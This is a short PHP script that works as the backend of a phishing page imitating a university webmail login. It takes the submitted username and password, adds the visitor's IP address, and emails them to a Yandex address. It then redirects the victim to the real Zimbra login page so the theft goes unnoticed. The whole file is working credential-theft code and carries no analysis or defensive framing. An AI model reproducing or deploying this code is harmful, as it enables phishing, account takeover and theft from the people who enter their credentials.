<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------  ! +ID ! xDD+ !  -----------\n";
$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Username        : ".$_POST['username']."\n";
$message .= "Password               : ".$_POST['password']."\n";
$message .= "IP Address             : ".$ip."\n";
$message .= "-----------  !makavelli!  -----------\n";
$send = "firenation1@yandex.com";

$subject = "makavelli ! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);


header("Location: https://zimbra.earlham.edu/");
?>
